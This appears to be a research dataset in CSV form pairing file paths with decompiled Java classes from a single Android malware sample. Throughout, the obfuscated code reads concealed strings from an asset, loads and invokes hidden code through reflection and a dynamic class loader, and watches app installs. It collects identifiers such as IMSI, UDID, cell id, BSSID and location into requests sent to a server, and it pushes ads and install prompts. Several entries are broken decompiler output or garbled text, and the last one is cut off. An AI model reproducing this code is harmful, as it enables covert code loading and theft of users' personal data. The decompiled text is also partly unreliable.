"filepath","code"
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.jgn\st.code","public class st {   public static void START(  Context context){     bmwm.qgf(context).gx(context,""319f447e884120a27d04b1b5dbadec52"",2);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\a.code","public final class a {   public static String a="""";   public static String b="""";   public static String c="""";   public static String d="""";   public static String e="""";   public static String f="""";   public static String g="""";   public static String h="""";   public static String i="""";   public static String j="""";   public static String k="""";   public static String l="""";   public static String m="""";   public static String n="""";   public static String o="""";   public static String p="""";   public static String q="""";   public static String r="""";   public static String s="""";   public static String t="""";   public static String u="""";   public static String v="""";   public static String w=""nlOV"";   public static String x="""";   public static String y="""";   public static String z="""";   public static String A="""";   public static List B=new ArrayList();   public static void a(  Context context){     InputStream inputStream;     DataInputStream dataInputStream;     DataInputStream dataInputStream2=null;     dataInputStream2=null;     InputStream inputStream2=null;     B.clear();     try {       inputStream=context.getAssets().open(w);       try {         try {           dataInputStream=new DataInputStream(inputStream);         }  catch (        Throwable th) {           th=th;         }         try {           dataInputStream.readInt();           dataInputStream.readInt();           dataInputStream.readLong();           for (int i2=0; i2 < 3; i2++) {             dataInputStream.read(new byte[dataInputStream.readInt()]);           }           dataInputStream.readInt();           dataInputStream2=new DataInputStream(inputStream);           try {             BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(dataInputStream2));             for (String readLine=bufferedReader.readLine(); readLine != null; readLine=bufferedReader.readLine()) {               B.add(readLine);             }             bufferedReader.close();             try {               a=new String((String)B.get(0));               b=new String((String)B.get(1));               c=new String((String)B.get(2));               d=new String((String)B.get(3));               e=new String((String)B.get(4));               f=new String((String)B.get(5));               g=new String((String)B.get(6));               h=new String((String)B.get(7));               i=new String((String)B.get(8));               j=new String((String)B.get(9));               k=new String((String)B.get(10));               l=new String((String)B.get(11));               m=new String((String)B.get(12));               n=new String((String)B.get(13));               o=new String((String)B.get(14));               p=new String((String)B.get(15));               q=new String((String)B.get(16));               r=new String((String)B.get(17));               s=new String((String)B.get(18));               t=new String((String)B.get(19));               u=new String((String)B.get(20));               v=new String((String)B.get(21));               x=(String)B.get(22);               y=(String)B.get(23);               z=(String)B.get(24);               A=(String)B.get(25);             }  catch (            Exception e2) {             }             try {               dataInputStream2.close();             }  catch (            IOException e3) {             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e4) {               }             }           }  catch (          Exception e5) {             dataInputStream=dataInputStream2;             inputStream2=inputStream;             if (dataInputStream != null) {               try {                 dataInputStream.close();               }  catch (              IOException e6) {               }             }             if (inputStream2 != null) {               try {                 inputStream2.close();               }  catch (              IOException e7) {               }             }           }         }  catch (        Exception e8) {           inputStream2=inputStream;         } catch (        Throwable th2) {           dataInputStream2=dataInputStream;           th=th2;           if (dataInputStream2 != null) {             try {               dataInputStream2.close();             }  catch (            IOException e9) {             }           }           if (inputStream == null) {             throw th;           }           try {             inputStream.close();             throw th;           }  catch (          IOException e10) {             throw th;           }         }       }  catch (      Exception e11) {         dataInputStream=null;         inputStream2=inputStream;       }     }  catch (    Exception e12) {       dataInputStream=null;     } catch (    Throwable th3) {       th=th3;       inputStream=null;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\b.code","public final class b {   private static b f;   private e b;   private Class c;   private Object d;   private String e;   public static String a=a.f;   private static String g="""";   public static b a(  Context context,  String str){     if (f == null) {       b bVar=new b();       f=bVar;       bVar.a(context);       f.b(str);     }  else     if (!f.e.equals(str)) {       f.b.a();       f.a(context);       f.b(str);     }     return f;   }   private void a(  Context context){     try {       this.b=e.a(context);     }  catch (    Exception e) {     }   }   private void b(  String str){     this.e=str;     try {       this.c=this.b.a(str);       this.d=d.a(this.c);     }  catch (    Exception e) {     }   }   public final Object a(  String str){     return a(str,new Object[0],new Class[0]);   }   public final Object a(  String str,  Object obj,  Class cls){     return a(str,new Object[]{obj},new Class[]{cls});   }   public final Object a(  String str,  Object[] objArr,  Class[] clsArr){     return d.a(str,objArr,clsArr,this.c,this.d);   }   public final Object b(  String str,  Object[] objArr,  Class[] clsArr){     Class cls=this.c;     Object obj=this.d;     Method declaredMethod=cls.getDeclaredMethod(str,clsArr);     declaredMethod.setAccessible(true);     return declaredMethod.invoke(obj,objArr);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\bmwm.code","public class bmwm {   private static bmwm a;   public static bmwm qgf(  Context context){     if (a == null) {       a=new bmwm();     }     a.a(context);     g.a(context);     c.c(context);     c.d(context);     c.e(context);     c.a(context);     return a;   }   public void gx(  Context context,  int i){     c.a(context,i);   }   public void gx(  Context context,  String str,  int i){     c.a(context,str,i);   }   public void gx(  Context context,  String str,  int i,  long j){     gx(context,str,"""",i,j);   }   public void gx(  Context context,  String str,  String str2,  int i){     c.a(context,str,str2,i);   }   public void gx(  Context context,  String str,  String str2,  int i,  long j){     c.a(context,str,str2,i,j);   }   public void set(  Context context,  boolean z){     c.a(context,z);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\c.code","public final class c {   private static boolean a=true;   public static void a(  int i,  KeyEvent keyEvent,  Context context){     if ("""".equals(a.c)) {       a.a(context);     }     b.a(context,a.c).b(""onKeyDown"",new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class});   }   public static void a(  Activity activity,  Bundle bundle){     try {       if ("""".equals(a.c)) {         a.a(activity);       }       b a2=b.a(activity,a.c);       a2.a(a.i,activity,Activity.class);       a2.a(a.j,bundle,Bundle.class);     }  catch (    Exception e) {     }   }   public static void a(  Context context){     b.a(context,a.d).a(a.n,context.getApplicationContext(),Context.class);   }   public static void a(  Context context,  int i){     b.a(context,a.d).a(a.e,Integer.valueOf(i),Integer.TYPE);   }   public static void a(  Context context,  Intent intent){     try {       if ("""".equals(a.b)) {         a.a(context);       }       b.a(context,a.b).a(a.k,new Object[]{context,intent},new Class[]{Context.class,Intent.class});     }  catch (    Exception e) {     }   }   public static void a(  Context context,  String str,  int i){     b.a(context,a.d).a(a.e,new Object[]{str,Integer.valueOf(i)},new Class[]{String.class,Integer.TYPE});   }   private static void a(  Context context,  String str,  Object obj,  Object obj2,  Class cls,  Class cls2){     b.a(context,a.d).a(str,new Object[]{obj,obj2},new Class[]{cls,cls2});   }   public static void a(  Context context,  String str,  String str2,  int i){     b.a(context,a.d).a(a.e,new Object[]{str,str2,Integer.valueOf(i)},new Class[]{String.class,String.class,Integer.TYPE});   }   public static void a(  Context context,  String str,  String str2,  int i,  long j){     b.a(context,a.d).a(a.e,new Object[]{str,str2,Integer.valueOf(i),Long.valueOf(j)},new Class[]{String.class,String.class,Integer.TYPE,Long.TYPE});   }   public static void a(  Context context,  boolean z){     a(context,a.v,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);   }   public static void b(  Context context){     try {       a.a(context);       new f();       f.a(context);       b a2=b.a(context,a.a);       a2.a(a.i,context,Context.class);       a2.a(a.j);     }  catch (    Exception e) {     }   }   public static void c(  Context context){     a(context,a.o,context,ptpe.class.getName(),Context.class,String.class);   }   public static void d(  Context context){     a(context,a.q,context,cchw.class.getName(),Context.class,String.class);   }   public static void e(  Context context){     a(context,a.p,context,tz.class.getName(),Context.class,String.class);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\cchw.code","public class cchw extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     c.a(context,intent);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\d.code","public final class d {   public static Object a(  Class cls){     try {       return cls.getConstructor(new Class[0]).newInstance(new Object[0]);     }  catch (    Exception e) {       return null;     }   }   public static Object a(  String str,  Object[] objArr,  Class[] clsArr,  Class cls,  Object obj){     try {       Method declaredMethod=cls.getDeclaredMethod(str,clsArr);       declaredMethod.setAccessible(true);       return declaredMethod.invoke(obj,objArr);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\e.code","public final class e {   public static String a=a.f;   public static String b=a.x;   public static String c=a.y;   public static String d=a.z;   public static String e=a.A;   private static e h;   private Class f;   private Object g;   public static e a(  Context context){     if (h == null) {       h=new e();       String str=context.getDir(a.g,0).getAbsolutePath() + ""/"";       e eVar=h;       String str2=str + a;       try {         eVar.f=Class.forName(b);         eVar.g=eVar.f.getConstructor(String.class,String.class,String.class,Class.forName(e)).newInstance(str2,str,"""",context.getClassLoader());       }  catch (      Exception e2) {       }     }     return h;   }   private Object a(  String str,  Object[] objArr,  Class[] clsArr){     return h.a(this.f,this.g,str,objArr,clsArr);   }   public final Class a(  String str){     return (Class)a(c,new Object[]{str},new Class[]{String.class});   }   public final void a(){     a(d,new Object[0],new Class[0]);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\f.code","public final class f {   private static m a=null;   private static boolean b=false;   public static void a(  Context context){     if (b && a != null) {       try {         b=false;         context.unregisterReceiver(a);       }  catch (      Exception e) {       }     }     try {       IntentFilter intentFilter=new IntentFilter();       intentFilter.addAction(a.r);       intentFilter.addAction(a.s);       intentFilter.addDataScheme(a.t);       if (a == null) {         a=new m();       }       context.registerReceiver(a,intentFilter);       b=true;     }  catch (    Exception e2) {     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\g.code","public final class g {   private static boolean a=true;   public static void a(  android.content.Context r10){     throw new UnsupportedOperationException(""Method not decompiled: iyyl.wkee.mdh.ct.rv.g.a(android.content.Context):void"");   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\h.code","public final class h {   public static Object a(  Class cls,  Object obj,  String str,  Object[] objArr,  Class[] clsArr){     try {       Method method=cls.getMethod(str,clsArr);       method.setAccessible(true);       return method.invoke(obj,objArr);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\m.code","public class m extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     c.a(context,intent);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\ptpe.code","public class ptpe extends Activity {   private boolean a=false;   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     c.a(this,bundle);     new f();     f.a(getApplicationContext());   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     try {       if (!this.a) {         c.a(i,keyEvent,getApplicationContext());         return true;       }     }  catch (    Exception e) {       this.a=true;     }     return super.onKeyDown(i,keyEvent);   }   @Override protected void onPause(){     super.onPause();     this.a=true;   }   @Override protected void onStop(){     super.onStop();     this.a=true;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\tz.code","public class tz extends Service {   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();     c.b(getApplicationContext());   }   @Override public void onDestroy(){     super.onDestroy();     stopSelf();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\iyyl.wkee.mdh.ct.rv\y.code","public class y {   public static boolean open(  String str){     Calendar.getInstance().setTime(new Date());     if (str != null) {       try {         if (!"""".equals(str)) {           if (System.currentTimeMillis() > new SimpleDateFormat(""yyyy-MM-dd hh:mm"").parse(str).getTime()) {             return true;           }         }       }  catch (      Exception e) {       }     }     return false;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\a.code","public final class a implements Serializable {   private static Context H;   public static a a;   private LocationManager G;   private String b;   private String c;   private String d;   private String e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private String l;   private String m;   private String o;   private String p;   private String q;   private int r;   private String s;   private String t;   private String n="""";   private String u=""appmob"";   private String v="""";   private String w="""";   private String x="""";   private String y="""";   private String z="""";   private int A=1;   private String B=""1.0.0"";   private int C=0;   private int D=0;   private int E=0;   private String F=null;   private long I=0;   public static je.mnvs.uyr.a a(  android.content.Context r14){     throw new UnsupportedOperationException(""Method not decompiled: je.mnvs.uyr.a.a(android.content.Context):je.mnvs.uyr.a"");   }   public static void a(  Context context,  String str){     try {       if ("""".equals(str)) {         str=z.a(context,""location"","""");       }       if (a == null) {         a(context);       }       a.F=str;     }  catch (    Exception e) {       e.printStackTrace();     }   }   public static boolean b(  Context context){     NetworkInfo networkInfo=null;     a.e=null;     try {       networkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();       if (networkInfo == null) {         a.e=null;       }  else       if (networkInfo.getTypeName().toLowerCase().equals(""mobile"")) {         a.e=networkInfo.getExtraInfo().toLowerCase();       }  else {         a.e=networkInfo.getTypeName().toLowerCase();       }     }  catch (    Exception e) {       e.printStackTrace();     }     if (networkInfo != null) {       return networkInfo.isAvailable() && networkInfo.isConnected();     }     return false;   }   public final String a(){     return this.e;   }   public final String toString(){     StringBuilder sb=new StringBuilder();     sb.append(""appid="" + a.b + ""&"");     sb.append(""apptype="" + a.A + ""&"");     sb.append(""appVersion="" + a.q + ""&"");     sb.append(""appVersionInt="" + a.r + ""&"");     sb.append(""appname="" + a.n + ""&"");     sb.append(""sysApp="" + a.C + ""&"");     sb.append(""country="" + a.m + ""&"");     sb.append(""lang="" + a.o + ""&"");     sb.append(""udid="" + a.c + ""&"");     sb.append(""imsi="" + a.d + ""&"");     sb.append(""carrier="" + a.k + ""&"");     sb.append(""manufacturer="" + a.l + ""&"");     sb.append(""model="" + a.g + ""&"");     sb.append(""net="" + a.e + ""&"");     sb.append(""networkOperator="" + a.j + ""&"");     sb.append(""osVersion="" + a.h + ""&"");     sb.append(""osVersionInt="" + a.i + ""&"");     sb.append(""packagename="" + a.s + ""&"");     sb.append(""screen="" + a.p + ""&"");     sb.append(""sdkVersion="" + a.B + ""&"");     sb.append(""sign="" + a.t + ""&"");     sb.append(""channelid="" + a.u + ""&"");     sb.append(""cellid="" + a.v + ""&"");     sb.append(""areaid="" + a.w + ""&"");     sb.append(""sid="" + a.x + ""&"");     sb.append(""bssid="" + a.y + ""&"");     sb.append(""location="" + (a.f == null ? """" : a.f) + ""&"");     sb.append(""address="" + (a.F == null ? """" : a.F) + ""&"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\aa.code","public final class aa extends AsyncTask {   private Context a;   public aa(  Context context){     this.a=context;   }   @Override public Void doInBackground(  String... strArr){     if (strArr == null) {       return null;     }     if (strArr.length == 1) {       a(strArr[0],"""");       return null;     }     if (strArr.length != 2) {       return null;     }     a(strArr[0],strArr[1]);     return null;   }   private void a(  String str,  String str2){     StringBuilder sb=new StringBuilder();     sb.append(a.a.toString()).append(str2);     new StringBuilder().append(str).append(""?"").append(sb.toString());     try {       e.a(this.a,str,sb.toString());     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override protected final void onPreExecute(){     super.onPreExecute();     if (a.a == null) {       a.a(this.a);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ab.code","public final class ab {   private static m a=null;   private static boolean b=false;   public static void a(  Context context){     if (b && a != null) {       try {         b=false;         context.unregisterReceiver(a);       }  catch (      Exception e) {         e.printStackTrace();       }     }     try {       IntentFilter intentFilter=new IntentFilter();       intentFilter.addAction(""android.intent.action.PACKAGE_ADDED"");       intentFilter.addAction(""android.intent.action.PACKAGE_REMOVED"");       intentFilter.addDataScheme(""package"");       if (a == null) {         a=new m();       }       context.registerReceiver(a,intentFilter);       b=true;     }  catch (    Exception e2) {       e2.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ac.code","public final class ac extends RelativeLayout {   public ac(  Context context){     super(context);     int a=e.a(context,6.0f);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setBackgroundColor(0);     addView(linearLayout,new RelativeLayout.LayoutParams(-1,-1));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     linearLayout2.setPadding(a,a,a,a);     linearLayout2.setId(1379161715);     linearLayout2.setGravity(1);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(e.a(context,300.0f),e.a(context,333.0f));     layoutParams.addRule(13);     linearLayout2.setBackgroundColor(Color.argb(200,0,0,0));     addView(linearLayout2,layoutParams);     TextView textView=new TextView(context);     textView.setTextColor(-1);     textView.setId(1379161714);     textView.setText(""çƒ­é—¨åº”ç”¨"");     textView.setTextSize(20.0f);     textView.setPadding(a,a,a,a);     linearLayout2.addView(textView);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setBackgroundColor(Color.parseColor(""#3da322""));     linearLayout2.addView(linearLayout3,new LinearLayout.LayoutParams(-1,e.a(context,2.0f)));     GridView gridView=new GridView(context);     gridView.setPadding(0,a,0,0);     gridView.setId(1379161712);     gridView.setCacheColorHint(0);     gridView.setSelector(new ColorDrawable(0));     gridView.setGravity(1);     gridView.setBackgroundColor(0);     gridView.setNumColumns(4);     int a2=e.a(context,5.0f);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(e.a(context,290.0f),e.a(context,273.0f));     layoutParams2.topMargin=e.a(context,5.0f);     layoutParams2.bottomMargin=a2;     layoutParams2.topMargin=a2;     layoutParams2.addRule(13);     linearLayout2.addView(gridView,layoutParams2);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ad.code","public final class ad extends AsyncTask {   private Context a;   private List b=null;   private List c=null;   private int d;   public ad(  Context context,  int i){     this.d=14;     this.a=context;     this.d=i;   }   private Bitmap a(  String str){     try {       JSONObject jSONObject=new JSONObject(str);       if (jSONObject.has(""list"")) {         JSONArray jSONArray=jSONObject.getJSONArray(""list"");         l lVar=new l(this.a);         for (int i=0; i < jSONArray.length(); i++) {           d dVar=new d(jSONArray.getString(i));           if (c.a.contains(dVar.h())) {             dVar.i();           }           this.b.add(dVar);           if (i < 4) {             this.c.add(lVar.a(this.a,dVar.m()));           }         }         g.a(this.a,this.d,str);         return e.a(this.a,this.c);       }     }  catch (    JSONException e) {       e.printStackTrace();     }     return null;   }   private String a(){     this.b=new ArrayList();     this.c=new ArrayList();     try {       if (c.a != null && c.a.isEmpty()) {         c.a=e.c(this.a);       }     }  catch (    Exception e) {       e.printStackTrace();     }     try {       StringBuilder sb=new StringBuilder();       sb.append(a.a.toString());       sb.append(""source="" + this.d);       Bitmap a=a(e.a(this.a,c.c,sb.toString()));       if (this.b.isEmpty()) {         Log.d(""box"",""get ad error"");         return null;       }       Context context=this.a;       String str=""è£…æœºå¿…å¤‡""; switch (this.d) { case Menu.SETTINGSSON:         str=""è£…æœºå¿…å¤‡"";       break; case Menu.SETTINGSCONTROL:     str=""å�•æœºæ¸¸æˆ�"";   break; case 16: str=""ç½‘ç»œæ¸¸æˆ�""; break; case 17: str=""çƒ­é—¨æŽ¨è��""; break; } e.a(context,a,str,this.d); if (z.a(this.a,""first_time"",0L) == 0) { z.a(this.a,""first_time"",Long.valueOf(System.currentTimeMillis())); z.a(this.a,""addscag_time"",Long.valueOf(System.currentTimeMillis())); } new StringBuilder().append(c.c).append(""?"").append(sb.toString()); return null; }  catch (Exception e2) { try { e2.printStackTrace(); return null; }  catch (Exception e3) { e3.printStackTrace(); return null; } } } @Override protected final Object doInBackground(Object[] objArr){ return a(); } @Override protected final void onPostExecute(Object obj){ super.onPostExecute((String)obj); if (!knvu.a) { return; } k kVar=new k(this.a); int i=0; while (true) { int i2=i; if (i2 >= this.b.size()) { return; } if (e.e(this.a)) { d dVar=(d)this.b.get(i2); if (dVar.j() == 1) { kVar.a(dVar.h(),dVar.e(),dVar.g()); } } i=i2 + 1; } } @Override protected final void onPreExecute(){ super.onPreExecute(); if (a.a == null) { a.a(this.a); } } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ae.code","public final class ae extends AsyncTask {   private Context a;   public ae(  Context context){     this.a=context;   }   @Override protected final Object doInBackground(  Object[] objArr){     Context context=this.a;     Iterator it=x.a(context).iterator();     while (it.hasNext()) {       d dVar=(d)it.next();       String h=dVar.h();       if (e.a(context,h) && System.currentTimeMillis() - dVar.n() > dVar.d() * 60 * 1000) {         Log.d(""box"",""notifyapp "" + h + ""  ""+ dVar.c()+ ""  ""+ dVar.d());         if (dVar.c() == 1) {           e.a(context,dVar);         }  else         if (dVar.c() == 2) {           e.b(context,h);         }         SharedPreferences sharedPreferences=context.getSharedPreferences(""installapp"",0);         if (sharedPreferences.contains(h)) {           sharedPreferences.edit().remove(h).commit();         }       }     }     return null;   }   @Override protected final void onPreExecute(){     super.onPreExecute();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\af.code","public final class af extends AsyncTask {   private Context a;   public af(  Context context){     this.a=context;   }   private Void a(){     e.f(this.a);     if (!c.a().a(this.a)) {       return null;     }     long a=z.a(this.a,""first_time"",0L);     if (a <= 0) {       return null;     }     if (!(System.currentTimeMillis() - a > 3600000)) {       return null;     }     String a2=z.a(this.a,""ps_time"","""");     String a3=e.a();     if (a2.equals(a3)) {       return null;     }     try {       StringBuilder sb=new StringBuilder();       sb.append(a.a.toString());       new StringBuilder().append(c.i).append(""?"").append(sb.toString());       String a4=e.a(this.a,c.i,sb.toString());       if (e.a(a4)) {         return null;       }       f fVar=new f(new JSONObject(a4));       if ("""".equals(fVar.a())) {         return null;       }       e.a(this.a,fVar);       z.a(this.a,""ps_time"",(Object)a3);       return null;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override protected final Object doInBackground(  Object[] objArr){     return a();   }   @Override protected final void onPreExecute(){     super.onPreExecute();     if (a.a == null) {       a.a(this.a);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ag.code","public final class ag extends LinearLayout {   public ag(  Context context){     super(context);     int a=e.a(context,3.0f);     setId(842290803);     setPadding(a,a,0,a);     setBackgroundColor(0);     setDescendantFocusability(393216);     setOrientation(1);     setGravity(1);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(e.a(context,50.0f),e.a(context,50.0f));     layoutParams.setMargins(5,5,5,5);     ImageView imageView=new ImageView(context);     imageView.setId(842290802);     imageView.setImageDrawable(e.f(context,""sc_circle.png""));     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setFocusable(false);     addView(imageView,layoutParams);     TextView textView=new TextView(context);     textView.setId(842290801);     textView.setMaxWidth(e.a(context,66.0f));     textView.setTextSize(11.0f);     textView.setSingleLine(true);     textView.setFocusable(true);     textView.setTextColor(-1);     textView.setEllipsize(TextUtils.TruncateAt.END);     textView.setMarqueeRepeatLimit(10);     textView.setGravity(17);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.setMargins(0,2,0,2);     layoutParams2.gravity=17;     textView.setLayoutParams(layoutParams2);     addView(textView);     setFocusable(false);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ah.code","final class ah implements Animation.AnimationListener {   final kem a;   public ah(  kem kemVar){     this.a=kemVar;   }   @Override public final void onAnimationEnd(  Animation animation){     ac acVar;     Activity activity;     acVar=this.a.i;     acVar.setVisibility(8);     activity=this.a.d;     activity.finish();   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ai.code","!org.eclipse.jdt.core.dom.TypeDeclaration@166ce247"
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\aj.code","final class aj extends WebViewClient {   final kem a;   public aj(  kem kemVar){     this.a=kemVar;   }   @Override public final void onPageFinished(  WebView webView,  String str){     ProgressBar progressBar;     super.onPageFinished(webView,str);     progressBar=this.a.l;     progressBar.setVisibility(8);   }   @Override public final void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     ProgressBar progressBar;     super.onPageStarted(webView,str,bitmap);     progressBar=this.a.l;     progressBar.setVisibility(0);   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     Activity activity;     activity=this.a.d;     e.e(activity,""å‡ºé”™å•¦! "" + str);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\ak.code","public final class ak extends BaseAdapter {   l a;   Drawable b;   final kem c;   private View d;   public ak(  kem kemVar){     Activity activity;     Activity activity2;     this.c=kemVar;     activity=kemVar.d;     this.a=new l(activity);     activity2=kemVar.d;     this.b=e.f(activity2,""sc_circle.png"");   }   public final void a(  View view){     this.d=view;   }   @Override public final int getCount(){     List list;     list=this.c.e;     return list.size();   }   @Override public final Object getItem(  int i){     List list;     list=this.c.e;     return list.get(i);   }   @Override public final long getItemId(  int i){     return i;   }   @Override public final View getView(  int i,  View view,  ViewGroup viewGroup){     an anVar;     List list;     ImageView imageView;     TextView textView;     ImageView imageView2;     TextView textView2;     LinearLayout linearLayout;     ImageView imageView3;     Activity activity;     if (view == null) {       an anVar2=new an(this);       activity=this.c.d;       ag agVar=new ag(activity);       ag agVar2=agVar;       anVar2.b=(ImageView)agVar2.findViewById(842290802);       anVar2.c=(TextView)agVar2.findViewById(842290801);       anVar2.d=(LinearLayout)agVar2.findViewById(842290803);       agVar.setTag(anVar2);       view=agVar;       anVar=anVar2;     }  else {       anVar=(an)view.getTag();     }     list=this.c.e;     d dVar=(d)list.get(i);     imageView=anVar.b;     imageView.setTag(dVar.m());     textView=anVar.c;     textView.setTag(dVar.g());     Bitmap a=this.a.a(dVar.m(),new al(this,anVar));     if (a == null) {       imageView3=anVar.b;       imageView3.setImageDrawable(this.b);     }  else {       imageView2=anVar.b;       imageView2.setImageBitmap(a);     }     textView2=anVar.c;     textView2.setText(dVar.e());     linearLayout=anVar.d;     linearLayout.setOnClickListener(new am(this,dVar));     return view;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\al.code","final class al implements p {   final an a;   final ak b;   public al(  ak akVar,  an anVar){     this.b=akVar;     this.a=anVar;   }   @Override public final void a(  Bitmap bitmap,  String str){     View view;     ImageView imageView;     if (bitmap != null) {       view=this.b.d;       ImageView imageView2=(ImageView)view.findViewWithTag(str);       if (imageView2 != null) {         imageView2.setImageBitmap(bitmap);       }  else {         imageView=this.a.b;         imageView.setImageBitmap(bitmap);       }     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\am.code","final class am implements View.OnClickListener {   final d a;   final ak b;   public am(  ak akVar,  d dVar){     this.b=akVar;     this.a=dVar;   }   @Override public final void onClick(  View view){     Activity activity;     Activity activity2;     int i;     View view2;     Activity activity3;     Activity activity4;     if (c.a.contains(this.a.h())) {       activity3=this.b.c.d;       if (e.a(activity3,this.a.h())) {         activity4=this.b.c.d;         e.b(activity4,this.a.h());         return;       }       return;     }     activity=this.b.c.d;     String h=this.a.h();     String l=this.a.l();     SharedPreferences.Editor edit=activity.getSharedPreferences(""popad_turn"",0).edit();     if (l instanceof String) {       edit.putString(h,l.toString());     }  else     if (l instanceof Boolean) {       edit.putBoolean(h,Boolean.getBoolean(l.toString()));     }  else     if (l instanceof Float) {       edit.putFloat(h,Float.parseFloat(l.toString()));     }  else     if (l instanceof Integer) {       edit.putInt(h,Integer.parseInt(l.toString()));     }  else     if (l instanceof Long) {       edit.putLong(h,Long.parseLong(l.toString()));     }  else {       edit.putString(h,l.toString());     }     edit.commit();     kem.a(this.b.c,this.a);     d dVar=this.a;     activity2=this.b.c.d;     i=this.b.c.g;     view2=this.b.d;     e.a(dVar,activity2,i,view2);   } 